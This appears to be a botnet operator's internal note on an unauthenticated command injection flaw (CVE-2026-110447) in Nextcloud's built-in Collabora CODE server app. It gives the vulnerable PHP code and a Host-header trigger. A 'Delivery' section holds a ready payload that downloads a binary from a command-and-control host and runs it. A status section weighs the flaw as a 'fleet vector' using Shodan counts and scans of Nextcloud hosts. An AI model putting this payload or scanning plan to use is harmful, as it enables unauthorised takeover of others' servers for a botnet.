# Collabora Online CODE Server RCE (CVE-2026-110447)

Unauthenticated OS command injection (CWE-78) in the Nextcloud app
"Collabora Online - Built-in CODE Server" (richdocumentscode) < 26.4.303.

## Root cause
`src/proxy_*.php` `startCoolwsd()`:
```php
$lok_allow = "--o:net.lok_allow.host[14]=" . escapeshellarg($_SERVER['HTTP_HOST']);
$launchCmd = "bash -c \"( $appImage ... $lok_allow ... ) >/dev/null & disown\"";
exec($launchCmd, ...);
```
`escapeshellarg()` single-quotes the Host header, but the result is embedded in a
DOUBLE-quoted string passed to `/bin/sh -c`. Single quotes mean nothing inside
double quotes, so `$(...)` / backticks in the Host header execute as the
web-server user.

## Reachable
Unauthenticated, only while the built-in CODE server is NOT running
(container restart / upgrade / crash):
```
GET /apps/richdocumentscode/proxy.php?status
Host: x$(<command with spaces as ${IFS}>)
```
Standalone Collabora servers are NOT affected. Fixed in 26.4.303.

## Delivery (tag `collabora`, x86_64)
```
Host: x$(wget${IFS}-q${IFS}http://<CNC>/bin_x86_64${IFS}-O${IFS}/tmp/x;chmod${IFS}777${IFS}/tmp/x;/tmp/x${IFS}collabora)
```

## Status
- PoC verified valid (advisory + public exploit.py, saved here).
- Target window is narrow: requires richdocumentscode installed AND CODE server
  down. 0/100 Nextcloud samples were in the vulnerable state at scan time.
- Shodan `http.title:"Nextcloud"` ~97k; the app itself is niche (banner `richdocumentscode` ~6).
- No ELF bot registered yet => kept as "validated PoC / narrow window", not a fleet vector.

## Files
- `exploit.py` — public PoC (adriyansyah-mf/cve-2026-110447).
